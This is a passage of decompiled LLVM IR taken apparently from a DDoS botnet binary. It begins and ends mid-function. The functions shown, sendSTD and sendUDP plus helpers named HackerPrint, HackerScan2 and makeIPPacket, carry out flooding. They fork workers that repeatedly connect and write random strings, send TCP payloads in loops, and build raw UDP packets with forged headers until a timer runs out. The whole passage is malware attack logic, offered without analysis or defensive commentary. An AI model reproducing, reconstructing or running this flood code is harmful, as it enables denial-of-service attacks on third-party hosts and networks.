  %v4_804df29 = bitcast i32* %stack_var_-272 to i16*
  %v5_804df29 = call i32 @memcpy(i16* %v4_804df29, i32 ptrtoint ([62 x i8*]* @global_var_805c440.814 to i32), i32 248)
  %v2_804df54 = call i32 @__GI_time(i32* null)
  %v5_804df5c = add i32 %v2_804df54, %arg5
  store i32 %v5_804df5c, i32* @eax, align 4
  %v1_804df62 = call i32 @random()
  %v2_804df72 = ashr i32 %v1_804df62, 31
  %v2_804df75 = zext i32 %v1_804df62 to i64
  %v4_804df75 = zext i32 %v2_804df72 to i64
  %v5_804df75 = mul nuw i64 %v4_804df75, 4294967296
  %v6_804df75 = or i64 %v5_804df75, %v2_804df75
  %v10_804df75 = srem i64 %v6_804df75, 65
  %v11_804df75 = trunc i64 %v10_804df75 to i32
  store i32 %v11_804df75, i32* @eax, align 4
  %v0_804df79 = load i32, i32* @ebp, align 4
  %v2_804df79 = mul i32 %v11_804df75, 4
  %v3_804df79 = add i32 %v0_804df79, -268
  %v4_804df79 = add i32 %v3_804df79, %v2_804df79
  %v5_804df79 = inttoptr i32 %v4_804df79 to i32*
  %v6_804df79 = load i32, i32* %v5_804df79, align 4
  store i32 %v6_804df79, i32* @ebx, align 4
  %v0_804df80 = call i32 @random()
  store i32 3, i32* @edi, align 4
  %v2_804dfae = ptrtoint i32* %stack_var_-796 to i32
  %v3_804dfb5 = call i32 @sprintf(i32 %v2_804dfae, i32 ptrtoint ([62 x i8]* @global_var_805c550.818 to i32))
  %v5_804e06644 = icmp sgt i32 %arg6, 0
  br i1 %v5_804e06644, label %dec_label_pc_804dfc9, label %dec_label_pc_804e06c

dec_label_pc_804dfc9:                             ; preds = %entry, %dec_label_pc_804e05d
  %storemerge45 = phi i32 [ %v4_804e05d, %dec_label_pc_804e05d ], [ 0, %entry ]
  %v1_804dfc9 = call i32 @__libc_fork(i32 %storemerge45)
  %v1_804dfce = icmp eq i32 %v1_804dfc9, 0
  br i1 %v1_804dfce, label %dec_label_pc_804e05d, label %dec_label_pc_804e041.preheader

dec_label_pc_804e041.preheader:                   ; preds = %dec_label_pc_804dfc9
  %v4_804e010 = bitcast i32* %stack_var_-796 to i8*
  %v2_804e04638 = call i32 @__GI_time(i32* null)
  %v5_804e05141 = icmp slt i32 %v2_804e04638, %v5_804df5c
  br i1 %v5_804e05141, label %dec_label_pc_804dfd8.lr.ph, label %dec_label_pc_804e053

dec_label_pc_804dfd8.lr.ph:                       ; preds = %dec_label_pc_804e041.preheader
  br label %dec_label_pc_804dfd8

dec_label_pc_804dfd8:                             ; preds = %dec_label_pc_804dfd8.lr.ph, %dec_label_pc_804e041.backedge
  store i32 %arg1, i32* @edx, align 4
  %v4_804dfeb = call i32 @socket_connect(i32 %arg1, i16 %arg3)
  %v4_804dff6 = icmp eq i32 %v4_804dfeb, 0
  br i1 %v4_804dff6, label %dec_label_pc_804e041.backedge, label %dec_label_pc_804dffc

dec_label_pc_804dffc:                             ; preds = %dec_label_pc_804dfd8
  store i1 false, i1* @df, align 1
  store i32 %v2_804dfae, i32* @edi, align 4
  %v3_804e016 = call i32 @_strlen(i8* %v4_804e010)
  %v5_804e02b = call i32 @__libc_write(i32 %v4_804dfeb, i32* nonnull %stack_var_-796, i32 %v3_804e016)
  %v1_804e039 = call i32 @__libc_close(i32 %v4_804dfeb)
  br label %dec_label_pc_804e041.backedge

dec_label_pc_804e041.backedge:                    ; preds = %dec_label_pc_804dffc, %dec_label_pc_804dfd8
  %v2_804e046 = call i32 @__GI_time(i32* null)
  %v5_804e051 = icmp slt i32 %v2_804e046, %v5_804df5c
  br i1 %v5_804e051, label %dec_label_pc_804dfd8, label %dec_label_pc_804e053

dec_label_pc_804e053:                             ; preds = %dec_label_pc_804e041.backedge, %dec_label_pc_804e041.preheader
  %v1_804e058 = call i32 @__GI__exit(i32 1)
  unreachable

dec_label_pc_804e05d:                             ; preds = %dec_label_pc_804dfc9
  %v4_804e05d = add nuw nsw i32 %storemerge45, 1
  %v5_804e066 = icmp slt i32 %v4_804e05d, %arg6
  br i1 %v5_804e066, label %dec_label_pc_804dfc9, label %dec_label_pc_804e06c

dec_label_pc_804e06c:                             ; preds = %dec_label_pc_804e05d, %entry
  %storemerge.lcssa = phi i32 [ 0, %entry ], [ %v4_804e05d, %dec_label_pc_804e05d ]
  store i32 %v0_804df02, i32* @ebx, align 4
  ret i32 %storemerge.lcssa

; uselistorder directives
  uselistorder i32 %v4_804e05d, { 0, 2, 1 }
  uselistorder i32 %storemerge45, { 1, 0 }
  uselistorder i32 %v5_804df5c, { 1, 0, 2 }
  uselistorder i32 %arg6, { 1, 0 }
  uselistorder label %dec_label_pc_804dfd8, { 1, 0 }
  uselistorder label %dec_label_pc_804dfc9, { 1, 0 }
}

define i32 @sendSTD(i32 %arg1, i16 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-188 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v4_804e086 = call i32 @socket(i32 2, i32 2, i32 0)
  %v2_804e096 = call i32 @__GI_time(i32* null)
  %v1_804e0a8 = call i32 @__GI_gethostbyname(i32 %arg1)
  %v2_804e0b3 = ptrtoint i32* %stack_var_-44 to i32
  store i32 0, i32* %stack_var_-44, align 4
  store i32 0, i32* %stack_var_-40, align 4
  %v1_804e0d4 = add i32 %v1_804e0a8, 12
  %v2_804e0d4 = inttoptr i32 %v1_804e0d4 to i32*
  %v3_804e0d4 = load i32, i32* %v2_804e0d4, align 4
  %v2_804e0dc = ptrtoint i32* %stack_var_-40 to i32
  %v1_804e0e2 = add i32 %v1_804e0a8, 16
  %v2_804e0e2 = inttoptr i32 %v1_804e0e2 to i32*
  %v3_804e0e2 = load i32, i32* %v2_804e0e2, align 4
  %v1_804e0e5 = inttoptr i32 %v3_804e0e2 to i32*
  %v2_804e0e5 = load i32, i32* %v1_804e0e5, align 4
  %v4_804e0ed = call i32 @bcopy(i32 %v2_804e0e5, i32 %v2_804e0dc, i32 %v3_804e0d4)
  %v1_804e0f8 = add i32 %v1_804e0a8, 8
  %v2_804e0f8 = inttoptr i32 %v1_804e0f8 to i32*
  %v3_804e0f8 = load i32, i32* %v2_804e0f8, align 4
  store i32 %v3_804e0f8, i32* %stack_var_-44, align 4
  %v4_804e123 = bitcast i32* %stack_var_-188 to i16*
  %v5_804e1ae = add i32 %v2_804e096, %arg3
  br label %dec_label_pc_804e10d

dec_label_pc_804e10d:                             ; preds = %dec_label_pc_804e1d4, %entry
  %storemerge = phi i32 [ %v4_804e1d4, %dec_label_pc_804e1d4 ], [ 0, %entry ]
  %v5_804e123 = call i32 @memcpy(i16* %v4_804e123, i32 ptrtoint ([36 x i8*]* @global_var_805c720.855 to i32), i32 144)
  store i32 %v5_804e123, i32* @eax, align 4
  %v0_804e12b = call i32 @random()
  %v2_804e13b = udiv i32 %v0_804e12b, 36
  %tmp = mul nsw i32 %v2_804e13b, -4
  %v2_804e158 = add i32 %v0_804e12b, %tmp
  store i32 %v2_804e158, i32* @ebx, align 4
  %tmp31 = icmp ult i32 %storemerge, 50
  br i1 %tmp31, label %dec_label_pc_804e10d.dec_label_pc_804e1d4_crit_edge, label %dec_label_pc_804e176

dec_label_pc_804e10d.dec_label_pc_804e1d4_crit_edge: ; preds = %dec_label_pc_804e10d
  br label %dec_label_pc_804e1d4

dec_label_pc_804e176:                             ; preds = %dec_label_pc_804e10d
  %v0_804e166 = load i32, i32* @ebp, align 4
  %v3_804e166 = add i32 %v0_804e166, -184
  %v2_804e166 = mul i32 %v2_804e158, 4
  %v4_804e166 = add i32 %v3_804e166, %v2_804e166
  %v5_804e166 = inttoptr i32 %v4_804e166 to i32*
  %v6_804e166 = load i32, i32* %v5_804e166, align 4
  %v5_804e180 = call i32 @__libc_send(i32 %v4_804e086, i32 %v6_804e166, i32 75, i32 0)
  %v4_804e194 = call i32 @__libc_connect(i32 %v4_804e086, i32 %v2_804e0b3, i32 16)
  %v2_804e1a1 = call i32 @__GI_time(i32* null)
  %v5_804e1b3 = icmp slt i32 %v2_804e1a1, %v5_804e1ae
  br i1 %v5_804e1b3, label %dec_label_pc_804e1d4, label %dec_label_pc_804e1b5

dec_label_pc_804e1b5:                             ; preds = %dec_label_pc_804e176
  %v1_804e1bb = call i32 @__libc_close(i32 %v4_804e086)
  %v1_804e1c8 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804e1d4:                             ; preds = %dec_label_pc_804e10d.dec_label_pc_804e1d4_crit_edge, %dec_label_pc_804e176
  %stack_var_-16.0 = phi i32 [ %storemerge, %dec_label_pc_804e10d.dec_label_pc_804e1d4_crit_edge ], [ 0, %dec_label_pc_804e176 ]
  %v4_804e1d4 = add i32 %stack_var_-16.0, 1
  br label %dec_label_pc_804e10d

; uselistorder directives
  uselistorder i32 %v2_804e158, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v1_804e0a8, { 1, 0, 2 }
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32 144, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bcopy, { 1, 0 }
  uselistorder i32 (i32)* @__GI_gethostbyname, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e1d4, { 1, 0 }
}

define i32 @sendUDP(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_4()
  %tmp32 = call i16 @__decompiler_undefined_function_4()
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-140 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_804e1e0 = load i32, i32* @ebx, align 4
  %v12_804e1e1 = ptrtoint i32* %stack_var_-108 to i32
  store i32 2, i32* %stack_var_-68, align 4
  %v4_804e1ea = icmp eq i32 %arg2, 0
  %v1_804e1ee = icmp eq i1 %v4_804e1ea, false
  br i1 %v1_804e1ee, label %dec_label_pc_804e1fb, label %dec_label_pc_804e1f0

dec_label_pc_804e1f0:                             ; preds = %entry
  %v1_804e1f0 = call i32 @rand_cmwc(i32 2)
  br label %dec_label_pc_804e213

dec_label_pc_804e1fb:                             ; preds = %entry
  %v1_804e1fe = urem i32 %arg2, 65536
  store i32 %v1_804e1fe, i32* %eax.global-to-local, align 4
  %v1_804e207 = call i32 @htons(i32 %v1_804e1fe)
  br label %dec_label_pc_804e213

dec_label_pc_804e213:                             ; preds = %dec_label_pc_804e1f0, %dec_label_pc_804e1fb
  %v2_804e216 = ptrtoint i32* %stack_var_-68 to i32
  %v15_804e219 = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v15_804e219, i32* %eax.global-to-local, align 4
  %v4_804e220 = call i32 @getHost(i32 %arg1, i32* nonnull %stack_var_-64)
  store i32 %v4_804e220, i32* %eax.global-to-local, align 4
  %v1_804e228 = icmp eq i32 %v4_804e220, 0
  %v1_804e22a = icmp eq i1 %v1_804e228, false
  br i1 %v1_804e22a, label %dec_label_pc_804e631, label %dec_label_pc_804e230

dec_label_pc_804e230:                             ; preds = %dec_label_pc_804e213
  store i32 %arg6, i32* %eax.global-to-local, align 4
  %v9_804e249 = icmp eq i32 %arg4, 32
  %v1_804e24d = icmp eq i1 %v9_804e249, false
  br i1 %v1_804e24d, label %dec_label_pc_804e339, label %dec_label_pc_804e253

dec_label_pc_804e253:                             ; preds = %dec_label_pc_804e230
  %v4_804e25c = call i32 @socket(i32 2, i32 2, i32 17)
  store i32 %v4_804e25c, i32* %eax.global-to-local, align 4
  %v4_804e267 = icmp eq i32 %v4_804e25c, 0
  %v1_804e26b = icmp eq i1 %v4_804e267, false
  br i1 %v1_804e26b, label %dec_label_pc_804e288, label %dec_label_pc_804e26d

dec_label_pc_804e26d:                             ; preds = %dec_label_pc_804e253
  %v0_804e26d = load i32, i32* @global_var_805f8c0.20, align 64
  store i32 %v0_804e26d, i32* %eax.global-to-local, align 4
  %v3_804e27b = call i32 @HackerPrint(i32 %v0_804e26d, i32 ptrtoint ([27 x i8]* @global_var_805c7b0.856 to i32))
  store i32 %v3_804e27b, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e631

dec_label_pc_804e288:                             ; preds = %dec_label_pc_804e253
  %v1_804e28b = add i32 %arg5, 1
  store i32 %v1_804e28b, i32* %eax.global-to-local, align 4
  %v1_804e290 = call i32 @malloc(i32 %v1_804e28b)
  store i32 %v1_804e290, i32* %eax.global-to-local, align 4
  %v4_804e29b = icmp eq i32 %v1_804e290, 0
  br i1 %v4_804e29b, label %dec_label_pc_804e631, label %dec_label_pc_804e2a5

dec_label_pc_804e2a5:                             ; preds = %dec_label_pc_804e288
  store i32 %v1_804e28b, i32* %edx.global-to-local, align 4
  %v1_804e2ae = inttoptr i32 %v1_804e290 to i8*
  store i32 %v1_804e290, i32* @edi, align 4
  store i1 false, i1* @df, align 1
  %v1_804e2b3 = and i32 %v1_804e290, -256
  store i32 %v1_804e2b3, i32* %eax.global-to-local, align 4
  %v5_804e2b5 = call i8* @_memset(i8* %v1_804e2ae, i32 %v1_804e2b3, i32 %v1_804e28b)
  %v3_804e2bd = call i32 @makeRandomStr(i8* %v1_804e2ae, i32 %arg5)
  store i32 %v3_804e2bd, i32* %eax.global-to-local, align 4
  %v2_804e2ca = call i32 @__GI_time(i32* null)
  %v5_804e2d2 = add i32 %v2_804e2ca, %arg3
  store i32 %v5_804e2d2, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e2e1

dec_label_pc_804e2e1:                             ; preds = %dec_label_pc_804e315, %dec_label_pc_804e334, %dec_label_pc_804e2a5
  %stack_var_-84.0 = phi i32 [ 0, %dec_label_pc_804e2a5 ], [ %v4_804e334, %dec_label_pc_804e334 ], [ 0, %dec_label_pc_804e315 ]
  store i32 %v2_804e216, i32* %eax.global-to-local, align 4
  store i32 %arg5, i32* %edx.global-to-local, align 4
  store i32 %v4_804e25c, i32* %stack_var_-140, align 4
  %v7_804e2f6 = call i32 @__libc_sendto(i32 %v4_804e25c, i32 %v1_804e290, i32 %arg5, i32 0, i32 %v2_804e216, i32 16)
  store i32 %v7_804e2f6, i32* %eax.global-to-local, align 4
  store i32 %arg6, i32* %edx.global-to-local, align 4
  %v15_804e301 = icmp eq i32 %stack_var_-84.0, %arg6
  %v1_804e304 = icmp eq i1 %v15_804e301, false
  br i1 %v1_804e304, label %dec_label_pc_804e334, label %dec_label_pc_804e306

dec_label_pc_804e306:                             ; preds = %dec_label_pc_804e2e1
  br i1 %v1_804e1ee, label %dec_label_pc_804e315, label %dec_label_pc_804e30c

dec_label_pc_804e30c:                             ; preds = %dec_label_pc_804e306
  %v0_804e30c = load i32, i32* %stack_var_-140, align 4
  %v1_804e30c = call i32 @rand_cmwc(i32 %v0_804e30c)
  store i32 %v1_804e30c, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e315

dec_label_pc_804e315:                             ; preds = %dec_label_pc_804e306, %dec_label_pc_804e30c
  %v2_804e31a = call i32 @__GI_time(i32* null)
  store i32 %v2_804e31a, i32* %eax.global-to-local, align 4
  %v8_804e325 = icmp sgt i32 %v2_804e31a, %v5_804e2d2
  br i1 %v8_804e325, label %dec_label_pc_804e631, label %dec_label_pc_804e2e1

dec_label_pc_804e334:                             ; preds = %dec_label_pc_804e2e1
  %v4_804e334 = add i32 %stack_var_-84.0, 1
  br label %dec_label_pc_804e2e1

dec_label_pc_804e339:                             ; preds = %dec_label_pc_804e230
  store i32 %v12_804e1e1, i32* %eax.global-to-local, align 4
  %v4_804e347 = call i32 @socket(i32 2, i32 3, i32 17)
  store i32 %v4_804e347, i32* %eax.global-to-local, align 4
  %v4_804e352 = icmp eq i32 %v4_804e347, 0
  %v1_804e356 = icmp eq i1 %v4_804e352, false
  br i1 %v1_804e356, label %dec_label_pc_804e373, label %dec_label_pc_804e358

dec_label_pc_804e358:                             ; preds = %dec_label_pc_804e339
  %v0_804e358 = load i32, i32* @global_var_805f8c0.20, align 64
  store i32 %v0_804e358, i32* %eax.global-to-local, align 4
  %v3_804e366 = call i32 @HackerPrint(i32 %v0_804e358, i32 ptrtoint ([27 x i8]* @global_var_805c7b0.856 to i32))
  store i32 %v3_804e366, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e62e

dec_label_pc_804e373:                             ; preds = %dec_label_pc_804e339
  store i32 1, i32* %stack_var_-72, align 4
  %v2_804e37f = ptrtoint i32* %stack_var_-72 to i32
  store i32 %v2_804e37f, i32* %eax.global-to-local, align 4
  store i32 %v4_804e347, i32* %stack_var_-140, align 4
  %v5_804e38a = call i32 @__GI_setsockopt(i32 %v4_804e347, i32 0, i32 3, i32 %v2_804e37f, i32 4)
  store i32 %v5_804e38a, i32* %eax.global-to-local, align 4
  %v2_804e392 = icmp slt i32 %v5_804e38a, 0
  %v1_804e394 = icmp eq i1 %v2_804e392, false
  br i1 %v1_804e394, label %dec_label_pc_804e3ea.preheader, label %dec_label_pc_804e396

dec_label_pc_804e3ea.preheader:                   ; preds = %dec_label_pc_804e373
  br label %dec_label_pc_804e3ba

dec_label_pc_804e396:                             ; preds = %dec_label_pc_804e373
  %v0_804e396 = load i32, i32* @global_var_805f8c0.20, align 64
  store i32 %v0_804e396, i32* %eax.global-to-local, align 4
  %v3_804e3a4 = call i32 @HackerPrint(i32 %v0_804e396, i32 ptrtoint ([33 x i8]* @global_var_805c7cc.857 to i32))
  store i32 %v3_804e3a4, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e62e

dec_label_pc_804e3ba:                             ; preds = %dec_label_pc_804e3ea.preheader, %dec_label_pc_804e3ba
  %stack_var_-32.073 = phi i32 [ 50, %dec_label_pc_804e3ea.preheader ], [ %v4_804e3ea, %dec_label_pc_804e3ba ]
  %v4_804e3ea = add nsw i32 %stack_var_-32.073, -1
  %v2_804e3bf = call i32 @__GI_time(i32* null)
  store i32 %v2_804e3bf, i32* %eax.global-to-local, align 4
  store i32 %v2_804e3bf, i32* @ebx, align 4
  %v1_804e3c9 = call i32 @rand_cmwc(i32 0)
  %v1_804e3ce = load i32, i32* @ebx, align 4
  %v2_804e3ce = xor i32 %v1_804e3ce, %v1_804e3c9
  store i32 %v2_804e3ce, i32* @eax, align 4
  %v1_804e3d4 = call i32 @srand(i32 %v2_804e3ce)
  store i32 %v1_804e3d4, i32* @eax, align 4
  %v0_804e3dc = call i32 @random()
  store i32 %v0_804e3dc, i32* %eax.global-to-local, align 4
  %v1_804e3e2 = call i32 @init_rand(i32 %v0_804e3dc)
  store i32 %v1_804e3e2, i32* %eax.global-to-local, align 4
  %v13_804e3ed = icmp eq i32 %v4_804e3ea, 0
  %v1_804e3f1 = icmp eq i1 %v13_804e3ed, false
  br i1 %v1_804e3f1, label %dec_label_pc_804e3ba, label %dec_label_pc_804e3f3

dec_label_pc_804e3f3:                             ; preds = %dec_label_pc_804e3ba
  %v4_804e3f3 = icmp eq i32 %arg4, 0
  %v1_804e3f7 = icmp eq i1 %v4_804e3f3, false
  br i1 %v1_804e3f7, label %dec_label_pc_804e402, label %dec_label_pc_804e418

dec_label_pc_804e402:                             ; preds = %dec_label_pc_804e3f3
  %v5_804e409 = sub i32 32, %arg4
  %v2_804e411 = urem i32 %v5_804e409, 32
  %v4_804e411 = icmp eq i32 %v2_804e411, 0
  br i1 %v4_804e411, label %bb72, label %bb

bb:                                               ; preds = %dec_label_pc_804e402
  %v5_804e411 = shl i32 1, %v2_804e411
  br label %bb72

bb72:                                             ; preds = %dec_label_pc_804e402, %bb
  %v0_804e413 = phi i32 [ %v5_804e411, %bb ], [ 1, %dec_label_pc_804e402 ]
  %v1_804e413 = sub i32 0, %v0_804e413
  store i32 %v1_804e413, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e418

dec_label_pc_804e418:                             ; preds = %dec_label_pc_804e3f3, %bb72
  %storemerge6 = phi i32 [ %v1_804e413, %bb72 ], [ 0, %dec_label_pc_804e3f3 ]
  %v1_804e41b = add i32 %arg5, 28
  %v1_804e427 = add i32 %arg5, 58
  %v2_804e42a = and i32 %v1_804e427, -16
  %v2_804e430 = sub i32 %v12_804e1e1, %v2_804e42a
  %v1_804e438 = add i32 %v2_804e430, 15
  %v2_804e43b = and i32 %v1_804e438, -16
  %v1_804e453 = add i32 %v2_804e43b, 20
  %v5_804e456 = inttoptr i32 %v1_804e453 to i16*
  %v1_804e45c = add i32 %arg5, 8
  store i32 %v1_804e45c, i32* @eax, align 4
  store i32 %v1_804e45c, i32* @ebx, align 4
  %v5_804e464 = add i32 %v2_804e430, -16
  %v6_804e464 = inttoptr i32 %v5_804e464 to i32*
  store i32 %storemerge6, i32* %v6_804e464, align 4
  %v1_804e467 = call i32 @HackerScan2(i32 %v1_804e41b)
  store i32 %v1_804e467, i32* %eax.global-to-local, align 4
  %v0_804e46c = load i32, i32* @esp, align 4
  %v3_804e472 = inttoptr i32 %v0_804e46c to i32*
  store i32 %v1_804e467, i32* %v3_804e472, align 4
  %v0_804e473 = call i32 @htonl()
  store i32 %v0_804e473, i32* %eax.global-to-local, align 4
  %v0_804e478 = load i32, i32* @esp, align 4
  %v3_804e47b = load i32, i32* %stack_var_-64, align 4
  store i32 %v3_804e47b, i32* %edx.global-to-local, align 4
  %v0_804e481 = load i32, i32* @ebx, align 4
  %v2_804e481 = add i32 %v0_804e478, 8
  %v3_804e481 = inttoptr i32 %v2_804e481 to i32*
  store i32 %v0_804e481, i32* %v3_804e481, align 4
  %v1_804e482 = add i32 %v0_804e478, 4
  %v2_804e482 = inttoptr i32 %v1_804e482 to i32*
  store i32 17, i32* %v2_804e482, align 4
  %v3_804e484 = inttoptr i32 %v0_804e478 to i32*
  store i32 %v0_804e473, i32* %v3_804e484, align 4
  %v0_804e485 = load i32, i32* %edx.global-to-local, align 4
  %v2_804e485 = add i32 %v0_804e478, -4
  %v3_804e485 = inttoptr i32 %v2_804e485 to i32*
  store i32 %v0_804e485, i32* %v3_804e485, align 4
  %v5_804e486 = add i32 %v0_804e478, -8
  %v6_804e486 = inttoptr i32 %v5_804e486 to i32*
  store i32 %v2_804e43b, i32* %v6_804e486, align 4
  %v0_804e489 = call i32 @makeIPPacket()
  %v0_804e48e = load i32, i32* @esp, align 4
  %v1_804e497 = urem i32 %v1_804e45c, 65536
  store i32 %v1_804e497, i32* %eax.global-to-local, align 4
  %v2_804e49f = add i32 %v0_804e48e, 8
  %v3_804e49f = inttoptr i32 %v2_804e49f to i32*
  store i32 %v1_804e497, i32* %v3_804e49f, align 4
  %v2_804e4a0 = call i32 @htons(i32 %v1_804e453)
  %v3_804e4a0 = trunc i32 %v2_804e4a0 to i16
  %sext7 = mul i32 %v2_804e4a0, 65536
  %v1_804e4a8 = sdiv i32 %sext7, 65536
  store i32 %v1_804e4a8, i32* %edx.global-to-local, align 4
  store i32 %v1_804e453, i32* %eax.global-to-local, align 4
  %v3_804e4ad = add i32 %v2_804e43b, 24
  %v4_804e4ad = inttoptr i32 %v3_804e4ad to i16*
  store i16 %v3_804e4a0, i16* %v4_804e4ad, align 8
  %v2_804e4b1 = call i32 @rand_cmwc(i32 %v1_804e453)
  %sext = mul i32 %v2_804e4b1, 65536
  %v1_804e4b6 = sdiv i32 %sext, 65536
  store i32 %v1_804e4b6, i32* %edx.global-to-local, align 4
  store i32 %v1_804e453, i32* %eax.global-to-local, align 4
  %v1_804e4bb = trunc i32 %v1_804e4b6 to i16
  store i16 %v1_804e4bb, i16* %v5_804e456, align 4
  br i1 %v1_804e1ee, label %dec_label_pc_804e4cf, label %dec_label_pc_804e4c4

dec_label_pc_804e4c4:                             ; preds = %dec_label_pc_804e418
  %v2_804e4c4 = call i32 @rand_cmwc(i32 %v1_804e453)
  store i32 %v2_804e4c4, i32* %eax.global-to-local, align 4
  %.pre29 = urem i32 %arg2, 65536
  br label %dec_label_pc_804e4e7

dec_label_pc_804e4cf:                             ; preds = %dec_label_pc_804e418
  %v1_804e4d2 = urem i32 %arg2, 65536
  store i32 %v1_804e4d2, i32* %eax.global-to-local, align 4
  %v0_804e4d7 = load i32, i32* @esp, align 4
  %v2_804e4da = add i32 %v0_804e4d7, -16
  %v3_804e4da = inttoptr i32 %v2_804e4da to i32*
  store i32 %v1_804e4d2, i32* %v3_804e4da, align 4
  %v1_804e4db = sext i16 %tmp32 to i32
  %v2_804e4db = call i32 @htons(i32 %v1_804e4db)
  store i32 %v2_804e4db, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804e4e7

dec_label_pc_804e4e7:                             ; preds = %dec_label_pc_804e4c4, %dec_label_pc_804e4cf
  %v1_804e58b.pre-phi = phi i32 [ %.pre29, %dec_label_pc_804e4c4 ], [ %v1_804e4d2, %dec_label_pc_804e4cf ]
  %storemerge5.in = phi i32 [ %v2_804e4c4, %dec_label_pc_804e4c4 ], [ %v2_804e4db, %dec_label_pc_804e4cf ]
  %storemerge5 = trunc i32 %storemerge5.in to i16
  %sext8 = mul i32 %storemerge5.in, 65536
  %v4_804e4ea = sdiv i32 %sext8, 65536
  store i32 %v4_804e4ea, i32* %edx.global-to-local, align 4
  %v3_804e4ed = add i32 %v2_804e43b, 22
  %v4_804e4ed = inttoptr i32 %v3_804e4ed to i16*
  store i16 %storemerge5, i16* %v4_804e4ed, align 2
  %v1_804e4f4 = add i32 %v2_804e43b, 26
  %v2_804e4f4 = inttoptr i32 %v1_804e4f4 to i16*
  store i16 0, i16* %v2_804e4f4, align 2
  %v1_804e4fd = add i32 %v2_804e43b, 28
  store i32 %v1_804e4fd, i32* %eax.global-to-local, align 4
  %v4_804e500 = load i32, i32* @esp, align 4
  %v5_804e500 = add i32 %v4_804e500, -4
  %v6_804e500 = inttoptr i32 %v5_804e500 to i32*
  store i32 %arg5, i32* %v6_804e500, align 4
  %v0_804e503 = load i32, i32* %eax.global-to-local, align 4
  %v2_804e503 = add i32 %v4_804e500, -8
  %v3_804e503 = inttoptr i32 %v2_804e503 to i32*
  store i32 %v0_804e503, i32* %v3_804e503, align 4
  %v3_804e504 = inttoptr i32 %v4_804e4ea to i8*
  %v4_804e504 = call i32 @makeRandomStr(i8* %v3_804e504, i32 %v12_804e1e1)
  %v0_804e509 = load i32, i32* @esp, align 4
  store i32 %v2_804e43b, i32* %eax.global-to-local, align 4
  %v1_804e50f = or i32 %v2_804e43b, 2
  %v2_804e50f = inttoptr i32 %v1_804e50f to i16*
  %v3_804e50f = load i16, i16* %v2_804e50f, align 2
  %v4_804e50f = zext i16 %v3_804e50f to i32
  store i32 %v4_804e50f, i32* %edx.global-to-local, align 4
  store i32 %v2_804e43b, i32* %eax.global-to-local, align 4
  %v2_804e51e = add i32 %v0_804e509, 4
  %v3_804e51e = inttoptr i32 %v2_804e51e to i32*
  store i32 %v4_804e50f, i32* %v3_804e51e, align 4
  %v0_804e51f = load i32, i32* %eax.global-to-local, align 4
  %v3_804e51f = inttoptr i32 %v0_804e509 to i32*
  store i32 %v0_804e51f, i32* %v3_804e51f, align 4
  %v3_804e520 = inttoptr i32 %v4_804e4ea to i16*
  %v4_804e520 = call i32 @csum(i16* %v3_804e520, i32 %v12_804e1e1)
  %v5_804e520 = trunc i32 %v4_804e520 to i16
  %sext11 = mul i32 %v4_804e520, 65536
  %v1_804e528 = sdiv i32 %sext11, 65536
  store i32 %v1_804e528, i32* %edx.global-to-local, align 4
  store i32 %v2_804e43b, i32* %eax.global-to-local, align 4
  %v3_804e52d = or i32 %v2_804e43b, 10
  %v4_804e52d = inttoptr i32 %v3_804e52d to i16*
  store i16 %v5_804e520, i16* %v4_804e52d, align 2
  %v0_804e531 = load i32, i32* @esp, align 4
  %v1_804e534 = add i32 %v0_804e531, -16
  %v2_804e534 = inttoptr i32 %v1_804e534 to i32*
  store i32 0, i32* %v2_804e534, align 4
  %v2_804e536 = inttoptr i32 %v4_804e4ea to i32*
  %v3_804e536 = call i32 @__GI_time(i32* %v2_804e536)
  %v0_804e53b = load i32, i32* @esp, align 4
  %v1_804e53b = add i32 %v0_804e53b, 16
  %v5_804e53e = add i32 %v3_804e536, %arg3
  store i32 %v5_804e53e, i32* %eax.global-to-local, align 4
  %v3_804e5b5 = or i32 %v2_804e43b, 4
  %v4_804e5b5 = inttoptr i32 %v3_804e5b5 to i16*
  %v2_804e5d8 = or i32 %v2_804e43b, 12
  %v3_804e5d8 = inttoptr i32 %v2_804e5d8 to i32*
  br label %dec_label_pc_804e54d

dec_label_pc_804e54d:                             ; preds = %dec_label_pc_804e608, %dec_label_pc_804e626, %dec_label_pc_804e4e7
  %v0_804e553 = phi i32 [ %v1_804e53b, %dec_label_pc_804e4e7 ], [ %v0_804e553.pre.pre, %dec_label_pc_804e626 ], [ %v1_804e612, %dec_label_pc_804e608 ]
  %stack_var_-94.0 = phi i16 [ %tmp, %dec_label_pc_804e4e7 ], [ %storemerge, %dec_label_pc_804e626 ], [ %storemerge, %dec_label_pc_804e608 ]
  %stack_var_-80.0 = phi i32 [ 0, %dec_label_pc_804e4e7 ], [ %v4_804e626, %dec_label_pc_804e626 ], [ 0, %dec_label_pc_804e608 ]
  store i32 %v2_804e216, i32* %eax.global-to-local, align 4
  store i32 %v2_804e43b, i32* %edx.global-to-local, align 4
  %v1_804e556 = add i32 %v0_804e553, -12
  %v2_804e556 = inttoptr i32 %v1_804e556 to i32*
  store i32 16, i32* %v2_804e556, align 4
  %v2_804e558 = add i32 %v0_804e553, -16
  %v3_804e558 = inttoptr i32 %v2_804e558 to i32*
  store i32 %v2_804e216, i32* %v3_804e558, align 4
  %v1_804e559 = add i32 %v0_804e553, -20
